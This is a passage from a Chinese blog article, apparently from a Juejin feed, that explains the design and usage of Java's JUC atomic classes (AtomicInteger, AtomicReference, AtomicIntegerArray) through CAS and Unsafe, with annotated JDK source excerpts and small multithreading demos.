</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 并发编程：JUC 包中原子操作类的原理和用法]]></title>    <link>https://juejin.cn/post/7592939457042546740</link>    <guid>https://juejin.cn/post/7592939457042546740</guid>    <pubDate>2026-01-09T06:06:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592939457042546740" data-draft-id="7592892218669350946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 并发编程：JUC 包中原子操作类的原理和用法"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-09T06:06:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Java编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/819554264300154"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 并发编程：JUC 包中原子操作类的原理和用法
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/819554264300154/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Java编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:06:59.000Z" title="Fri Jan 09 2026 06:06:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>通过上一部分的分析，我们应该基本理解了 CAS 的无锁思想，并对“魔法类” Unsafe 有了更全面的了解。这也是我们分析原子包的前提。</p>
<p>接下来，让我们一步步分析 CAS 在 Java 中的应用。JDK5 之后，JUC 包提供了 <code>java.util.concurrent.atomic</code>包，该包下提供了大量基于 CAS 的原子操作类。如果在未来你不希望对程序代码加锁，但又想避免线程安全问题，那么可以使用该包下提供的类。Atomic 包提供的操作类主要可以分为以下四种类型：</p>
<ul>
<li>基本类型原子操作类</li>
<li>引用类型原子操作类</li>
<li>数组类型原子操作类</li>
<li>属性更新原子操作类</li>
</ul>
<h2 data-id="heading-0">1. 基本类型原子操作类</h2>
<p>Atomic 包提供的基本类型原子操作类有 AtomicInteger、AtomicBoolean 和 AtomicLong。它们的底层实现方式和使用方式是一样的。</p>
<p>所以我们只以其中一个——AtomicInteger 为例进行分析。AtomicInteger 主要用于对 int 类型的数据执行原子操作。它提供了原子自增方法、原子自减方法以及原子赋值方法等 API。</p>
<p>这里结合源码，我提供了一些注释：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AtomicInteger</span> <span class="hljs-title">extends</span> <span class="hljs-title">Number</span> <span class="hljs-title">implements</span> <span class="hljs-title">java.io.Serializable</span> {
    privatestaticfinallong serialVersionUID = <span class="hljs-number">6214790243416807050L</span>;

    <span class="hljs-comment">// 获取 Unsafe 类的实例</span>
    privatestaticfinal Unsafe <span class="hljs-keyword">unsafe</span> = Unsafe.getUnsafe();

    <span class="hljs-comment">// 变量 value 在 AtomicInteger 实例对象内的内存偏移量</span>
    privatestaticfinallong valueOffset;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
           <span class="hljs-comment">// 通过 Unsafe 类的 objectFieldOffset() 方法获取 value 变量在对象内存中的偏移量</span>
           <span class="hljs-comment">// 通过这个偏移量 valueOffset，Unsafe 类的内部方法可以访问该变量 value 以进行读写操作</span>
            valueOffset = <span class="hljs-keyword">unsafe</span>.objectFieldOffset
                (AtomicInteger.<span class="hljs-keyword">class</span>.getDeclaredField(<span class="hljs-string">"value"</span>));
        } <span class="hljs-keyword">catch</span> (Exception ex) { <span class="hljs-function">thrownew <span class="hljs-title">Error</span>(<span class="hljs-params">ex</span>)</span>; }
    }
   <span class="hljs-comment">// 当前 AtomicInteger 封装的 int 变量 value</span>
    privatevolatileint <span class="hljs-keyword">value</span>;

    <span class="hljs-keyword">public</span>...ment() {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span>.getAndAddInt(<span class="hljs-keyword">this</span>, valueOffset, <span class="hljs-number">-1</span>);
    }
   <span class="hljs-comment">// 当前值增加 delta 并返回旧值。底层 CAS 操作</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> final <span class="hljs-built_in">int</span> <span class="hljs-title">getAndAdd</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> delta</span>)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span>.getAndAddInt(<span class="hljs-keyword">this</span>, valueOffset, delta);
    }
    <span class="hljs-comment">// 当前值增加 1 并返回增加后的新值。底层 CAS 操作</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> final <span class="hljs-built_in">int</span> <span class="hljs-title">incrementAndGet</span>()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span>.getAndAddInt(<span class="hljs-keyword">this</span>, valueOffset, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;
    }
    <span class="hljs-comment">// 当前值减少 1 并返回减少后的新值。底层 CAS 操作</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> final <span class="hljs-built_in">int</span> <span class="hljs-title">decrementAndGet</span>()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span>.getAndAddInt(<span class="hljs-keyword">this</span>, valueOffset, <span class="hljs-number">-1</span>) - <span class="hljs-number">1</span>;
    }
   <span class="hljs-comment">// 当前值增加 delta 并返回新值。底层 CAS 操作</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> final <span class="hljs-built_in">int</span> <span class="hljs-title">addAndGet</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> delta</span>)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span>.getAndAddInt(<span class="hljs-keyword">this</span>, valueOffset, delta) + delta;
    }
   <span class="hljs-comment">// 省略了一些不常用的方法....</span>
}
</code></pre>
<p>从上述源码可知，AtomicInteger 原子类的所有方法中，没有使用任何互斥锁机制来实现同步，而是通过前面介绍的 Unsafe 类提供的 CAS 操作来保证线程安全。在我们之前的分析文章中提到，count++ 实际上存在线程安全问题。那么让我们观察一下 AtomicInteger 原子类中的自增实现 incrementAndGet：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> final <span class="hljs-built_in">int</span> <span class="hljs-title">incrementAndGet</span>()</span> {
   <span class="hljs-keyword">return</span> <span class="hljs-keyword">unsafe</span>.getAndAddInt(<span class="hljs-keyword">this</span>, valueOffset, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;
}
</code></pre>
<p>从上述源码可以看出，最终的实现是调用 <code>unsafe.getAndAddInt()</code>方法来完成的。正如我们在之前的分析中所学到的，这个方法是 JDK8 之后基于原始 CAS 操作的新方法。我们进一步跟进：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">getAndAddInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> delta)</span> </span>{
    <span class="hljs-type">int</span> v;
    <span class="hljs-keyword">do</span> {
        v = <span class="hljs-built_in">getIntVolatile</span>(o, offset);
    } <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">compareAndSwapInt</span>(o, offset, v, v + delta));
    <span class="hljs-keyword">return</span> v;
}
</code></pre>
<p>可以看出，<code>getAndAddInt</code>通过一个 do-while 死循环不断重试更新要设置的值，直到成功为止。其中调用了 Unsafe 类中的 <code>compareAndSwapInt</code>方法，这是一个 CAS 操作方法。注意：在 Java 8 之前的源码实现中，这里是一个 for 循环，并且自增逻辑是直接在 AtomicInteger 类中实现的。在 Java 8 中，它被替换为 while 循环并移动到了 Unsafe 类中实现。</p>
<p>下面让我们通过一个简单的小 Demo 来掌握基本类型原子操作类的用法：</p>
<pre><code class="hljs language-ini" lang="ini">public class AtomicIntegerDemo {

    static AtomicInteger <span class="hljs-attr">atomicInteger</span> = new AtomicInteger()<span class="hljs-comment">;</span>

    publicstaticclass AddThread implements Runnable {
        public void run(){
           for(int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10000; i++)</span>
               atomicInteger.incrementAndGet()<span class="hljs-comment">;</span>
        }

    }
    public static void main(String<span class="hljs-section">[]</span> args) throws InterruptedException {
        Thread<span class="hljs-section">[]</span> <span class="hljs-attr">threads</span> = new Thread[<span class="hljs-number">11</span>]<span class="hljs-comment">;</span>
        // 开启10个线程同时对 atomicInteger 进行自增操作
        for(int <span class="hljs-attr">i</span> = <span class="hljs-number">1</span><span class="hljs-comment">; i &lt;= 10; i++) {</span>
            threads<span class="hljs-section">[i]</span>=new Thread(new AddThread())<span class="hljs-comment">;</span>
        }

        for(int <span class="hljs-attr">i</span> = <span class="hljs-number">1</span><span class="hljs-comment">; i &lt;= 10; i++) {</span>
            threads<span class="hljs-section">[i]</span>.start()<span class="hljs-comment">;</span>
        }
         // 等待所有线程执行完毕再输出结果
        for(int <span class="hljs-attr">i</span> = <span class="hljs-number">1</span><span class="hljs-comment">; i &lt;= 10; i++) {</span>
            threads<span class="hljs-section">[i]</span>.join()<span class="hljs-comment">;</span>
        }

        System.out.println(atomicInteger)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>输出：<code>100000</code></p>
<p>在上面的 Demo 中，使用了 AtomicInteger 代替了原始的 int。这样，无需加锁即可保证线程安全。AtomicBoolean 和 AtomicLong 就不再分析了，其用法和原理是一样的。</p>
<h2 data-id="heading-1">2. 引用类型原子操作类</h2>
<p>引用类型的原子操作类主要分析 AtomicReference 类。其他的原理和用法也都一样。</p>
<p>让我们直接看一个例子：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicReferenceDemo</span> {
    publicstatic <span class="hljs-title class_">AtomicReference</span>&lt;<span class="hljs-title class_">Student</span>&gt; atomicStudentRef = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">Student</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Tom"</span>, <span class="hljs-number">18</span>);
        atomicStudentRef.<span class="hljs-title function_">set</span>(s1);
        <span class="hljs-title class_">Student</span> s2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">"Jerry"</span>, <span class="hljs-number">20</span>);
        atomicStudentRef.<span class="hljs-title function_">compareAndSet</span>(s1, s2);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(atomicStudentRef.<span class="hljs-title function_">get</span>().<span class="hljs-title function_">toString</span>());
    }

    <span class="hljs-meta">@AllArgsConstructor</span>
    <span class="hljs-keyword">static</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> {

        <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> name;
        privateint age;

        <span class="hljs-meta">@java</span>.<span class="hljs-property">lang</span>.<span class="hljs-property">Override</span>
        <span class="hljs-keyword">public</span> java.<span class="hljs-property">lang</span>.<span class="hljs-property">String</span> <span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">return</span><span class="hljs-string">"Student{"</span> +
                    <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">''</span><span class="hljs-string">' +
                    ", age=" + age +
                    '</span>}<span class="hljs-string">';
        }
    }
}
</span></code></pre>
<p>输出：</p>
<pre><code class="hljs language-ini" lang="ini">Student{<span class="hljs-attr">name</span>=<span class="hljs-string">'Jerry'</span>, age=<span class="hljs-number">20</span>}
</code></pre>
<p>在此之前，我们分析了原子计数器 AtomicInteger 类的底层实现是通过 Unsafe 类中的 CAS 操作完成的。那么我们要分析的 AtomicReference 底层又是如何实现的呢？</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicReference</span>&lt;V&gt; <span class="hljs-keyword">implements</span> java.<span class="hljs-property">io</span>.<span class="hljs-property">Serializable</span> {
    <span class="hljs-comment">// 获取 Unsafe 对象实例</span>
    privatestaticfinal <span class="hljs-title class_">Unsafe</span> unsafe = <span class="hljs-title class_">Unsafe</span>.<span class="hljs-title function_">getUnsafe</span>();
    <span class="hljs-comment">// 定义 value 偏移量</span>
    privatestaticfinallong valueOffset;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">/* 静态代码块在类加载时为 offset 赋值。通过 Unsafe 类提供的 API 获取类属性的地址，从而获取当前类中定义的属性 value 的地址 */</span>
            valueOffset = unsafe.<span class="hljs-property">objectFieldOffset</span>
                (<span class="hljs-title class_">AtomicReference</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">"value"</span>));
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> ex) { thrownew <span class="hljs-title class_">Error</span>(ex); }
    }
    <span class="hljs-comment">// 内部变量 value。Unsafe 类可以通过 valueOffset 内存偏移量获取该变量</span>
    privatevolatile V value;

    <span class="hljs-comment">/* 原子替换方法，间接调用 Unsafe 类的 compareAndSwapObject()，
    这是一个实现了 CAS 操作的本地方法 */</span>
    <span class="hljs-keyword">public</span> final <span class="hljs-built_in">boolean</span> <span class="hljs-title function_">compareAndSet</span>(<span class="hljs-params">V expect, V update</span>) {
        <span class="hljs-keyword">return</span> unsafe.<span class="hljs-title function_">compareAndSwapObject</span>(<span class="hljs-variable language_">this</span>, valueOffset, expect, update);
    }

    <span class="hljs-comment">// 设置并获取旧值</span>
    <span class="hljs-keyword">public</span> final V <span class="hljs-title function_">getAndSet</span>(<span class="hljs-params">V newValue</span>) {
        <span class="hljs-keyword">return</span> (V)unsafe.<span class="hljs-title function_">getAndSetObject</span>(<span class="hljs-variable language_">this</span>, valueOffset, newValue);
    }
    <span class="hljs-comment">// 省略代码......</span>
}

<span class="hljs-comment">// Unsafe 类中的 getAndSetObject 方法在调用时实际上仍然是一个 CAS 操作</span>
<span class="hljs-keyword">public</span> final <span class="hljs-title class_">Object</span> <span class="hljs-title function_">getAndSetObject</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> o, long offset, <span class="hljs-built_in">Object</span> newValue</span>) {
      <span class="hljs-title class_">Object</span> v;
      <span class="hljs-keyword">do</span> {
          v = <span class="hljs-title function_">getObjectVolatile</span>(o, offset);
      } <span class="hljs-keyword">while</span> (!<span class="hljs-title function_">compareAndSwapObject</span>(o, offset, v, newValue));
      <span class="hljs-keyword">return</span> v;
  }
</code></pre>
<p>从上述源码可知，AtomicReference 与我们之前分析的 AtomicInteger 原理大体相同，最终也都是通过 Unsafe 类提供的 CAS 操作实现的。AtomicReference 其他方法的实现原理也大致相同。</p>
<p>不过，需要注意的是 Java 8 为 AtomicReference 增加了几个新的 API：</p>
<ul>
<li>getAndUpdate(UnaryOperator)</li>
<li>updateAndGet(UnaryOperator)</li>
<li>getAndAccumulate(V, AnaryOperator)</li>
<li>accumulateAndGet(V, AnaryOperator)</li>
</ul>
<p>上述方法几乎存在于所有原子类中，这些方法可以在执行 CAS 操作之前，基于 Lambda 表达式对期望值或要更新的值执行其他操作。简单来说，就是在执行 CAS 更新之前，对期望值或要更新的值进行额外的修改。</p>
<h2 data-id="heading-2">3. 数组类型原子操作类</h2>
<p>数组类型原子操作类的含义其实很简单，指的是以原子的形式更新数组中的元素，以避免线程安全问题。JUC 包中的数组类型原子操作类具体分为以下三个类：</p>
<ul>
<li>AtomicIntegerArray</li>
<li>AtomicLongArray</li>
<li>AtomicReferenceArray</li>
</ul>
<p>同样，我们只分析单个类，其他两个大致相同。这里我们以 AtomicIntegerArray 为例进行分析：</p>
<pre><code class="hljs language-ini" lang="ini">public class AtomicIntegerArrayDemo {
    static AtomicIntegerArray <span class="hljs-attr">atomicArr</span> = new AtomicIntegerArray(<span class="hljs-number">10</span>)<span class="hljs-comment">;</span>

    publicstaticclass incrementTask implements Runnable {
        public void run() {
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10000; i++) {</span>
                atomicArr.getAndIncrement(i % atomicArr.length())<span class="hljs-comment">;</span>
            }
        }
    }

    public static void main(String<span class="hljs-section">[]</span> args) throws InterruptedException {
        Thread<span class="hljs-section">[]</span> <span class="hljs-attr">threads</span> = new Thread[<span class="hljs-number">10</span>]<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10; i++) {</span>
            threads<span class="hljs-section">[i]</span> = new Thread(new incrementTask())<span class="hljs-comment">;</span>
        }
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10; i++) {</span>
            threads<span class="hljs-section">[i]</span>.start()<span class="hljs-comment">;</span>
        }
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 10; i++) {</span>
            threads<span class="hljs-section">[i]</span>.join()<span class="hljs-comment">;</span>
        }
        System.out.println(atomicArr)<span class="hljs-comment">;</span>
    }
}
</code></pre>
<p>输出：</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">10000, 10000, 10000, 10000, 10000, 10000, 10000, 10000, 10000, 10000</span>]
</code></pre>
<p>在上面的 Demo 中，我们开启了 10 个线程对数组中的元素执行自增操作，执行结果符合我们的预期。接下来让我们一步步分析 AtomicIntegerArray 的内部实现逻辑。源码如下：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AtomicIntegerArray</span> <span class="hljs-title">implements</span> <span class="hljs-title">java.io.Serializable</span> {
    <span class="hljs-comment">// 获取 Unsafe 实例对象</span>
    privatestaticfinal Unsafe <span class="hljs-keyword">unsafe</span> = Unsafe.getUnsafe();
    <span class="hljs-comment">// 正如我们之前在 Unsafe 类中分析的那样，arrayBaseOffset() 的功能是：获取数组第一个元素的内存起始地址</span>
    privatestaticfinalint <span class="hljs-keyword">base</span> = <span class="hljs-keyword">unsafe</span>.arrayBaseOffset(<span class="hljs-built_in">int</span>[].<span class="hljs-keyword">class</span>);

    privatestaticfinalint shift;
    <span class="hljs-comment">// 内部数组</span>
    privatefinalint[] array;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// 获取数组中一个元素占用的内存空间</span>
        <span class="hljs-built_in">int</span> scale = <span class="hljs-keyword">unsafe</span>.arrayIndexScale(<span class="hljs-built_in">int</span>[].<span class="hljs-keyword">class</span>);
        <span class="hljs-comment">// 检查是否为 2 的幂次方，否则抛出异常</span>
        <span class="hljs-keyword">if</span> ((scale &amp; (scale - <span class="hljs-number">1</span>))!= <span class="hljs-number">0</span>)
            <span class="hljs-function">thrownew <span class="hljs-title">Error</span>(<span class="hljs-params"><span class="hljs-string">"data type scale not a power of two"</span></span>)</span>;
        <span class="hljs-comment">//</span>
        shift = <span class="hljs-number">31</span> - Integer.numberOfLeadingZeros(scale);
    }

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">long</span> <span class="hljs-title">checkedByteOffset</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> i</span>)</span> {
        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span> || i &gt;= array.length)
            <span class="hljs-function">thrownew <span class="hljs-title">IndexOutOfBoundsException</span>(<span class="hljs-params"><span class="hljs-string">"index "</span> + i</span>)</span>;

        <span class="hljs-keyword">return</span> byteOffset(i);
    }
    <span class="hljs-comment">// 计算数组中每个元素的内存地址</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">long</span> <span class="hljs-title">byteOffset</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> i</span>)</span> {
        <span class="hljs-keyword">return</span> ((<span class="hljs-built_in">long</span>) i &lt;&lt; shift) + <span class="hljs-keyword">base</span>;
    }
    <span class="hljs-comment">// 省略代码......</span>
}
</code></pre>
<p>在之前对 Unsafe 的分析中，我们了解到 <code>arrayBaseOffset</code>可以获取数组中第一个元素的内存起始位置，我们还有一个 API：<code>arrayIndexScale</code>可以获取数组中指定下标元素占用的内存空间大小。目前，AtomicIntegerArray 是 int 类型的。我们在学习 Java 基础时知道，int 的大小在内存中占用 4 个字节，所以 scale 的值为 4。那么现在，如果我们根据这两条信息来计算数组中每个元素的内存起始地址呢？稍微推导一下，我们可以得出以下结论：</p>
<blockquote>
<p>数组中每个元素的内存起始位置 = 数组第一个元素的起始位置 + 数组元素的下标 _ 数组中每个元素占用的内存空间</p>
</blockquote>
<p>而上述源码中的 <code>byteOffset(i)</code>方法就是上述公式的体现。有些人看到这里可能会感到困惑。这个方法的实现似乎与我刚才描述的结论不一致。别担心，让我们先看看 <code>shift</code>的值是如何获取的：</p>
<blockquote>
<p>shift = 31 — Integer.numberOfLeadingZeros(scale);</p>
<p>Integer.numberOfLeadingZeros(scale)：计算 scale 的前导零数量（转换为二进制后前面连续 0 的个数称为前导零）。scale = 4，转换为二进制是 00000000 00000000 00000000 00000100，所以前导零数量是 29，因此 shift 值为 2。</p>
</blockquote>
<p>那么回到我们需要解决的问题：如何计算数组中每个元素的内存起始位置？我们利用刚刚得到的 shift 值，将其应用到 <code>byteOffset(i)</code>方法中，来计算数组中每个元素的内存起始位置（前提是数组下标不越界）：</p>
<blockquote>
<p>byteOffset 方法体：(i &lt;&lt; shift) + base （i 是索引，即数组元素的下标，base 是数组第一个元素的内存起始位置）</p>
</blockquote>
<blockquote>
<p>第一个元素：memoryAddress = 0 &lt;&lt; 2 + base，即 memoryAddress = base + 0 * 4</p>
<p>第二个元素：memoryAddress = 1 &lt;&lt; 2 + base，即 memoryAddress = base + 1 * 4</p>
<p>第三个元素：memoryAddress = 2 &lt;&lt; 2 + base，即 memoryAddress = base + 2 * 4</p>
<p>第四个元素：memoryAddress = 3 &lt;&lt; 2 + base，即 memoryAddress = base + 3 * 4</p>
<p>其他元素的位置以此类推……</p>
</blockquote>
<p>以上描述就是 <code>AtomicIntegerArray.byteOffset</code>方法的原理。所以 <code>byteOffset(int)</code>方法可以根据数组下标计算每个元素的内存地址。</p>
<p>AtomicIntegerArray 中的其他方法都是通过间接调用 Unsafe 类的 CAS 原子操作方法实现的。让我们简单看几个常用的方法：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 执行自增操作并返回旧值。入参 i 是索引，即数组元素的下标</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">getAndIncrement</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>{
      <span class="hljs-keyword">return</span> <span class="hljs-built_in">getAndAdd</span>(i, <span class="hljs-number">1</span>);
}
<span class="hljs-comment">// 对指定下标的元素执行自增操作并返回新值</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title">incrementAndGet</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getAndAdd</span>(i, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;
}
<span class="hljs-comment">// 对指定下标的元素执行自减操作并返回新值</span>
